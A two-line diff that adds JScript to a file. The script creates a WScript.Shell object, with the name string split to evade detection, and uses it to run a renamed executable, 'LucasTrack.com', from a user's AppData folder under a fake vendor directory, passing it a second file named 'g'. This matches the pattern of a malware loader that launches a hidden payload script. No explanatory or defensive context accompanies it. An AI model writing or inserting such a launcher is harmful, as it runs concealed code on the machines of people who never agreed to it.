@@ -1,0 +1,2 @@
+LucasTrack = new ActiveXObject("Wscript."+"Shell")
+LucasTrack.Exec("\"C:\\Users\\Akemi\\AppData\\Local\\EcoOptimize Solutions\\LucasTrack.com\" \"C:\\Users\\Akemi\\AppData\\Local\\EcoOptimize Solutions\\g\"")
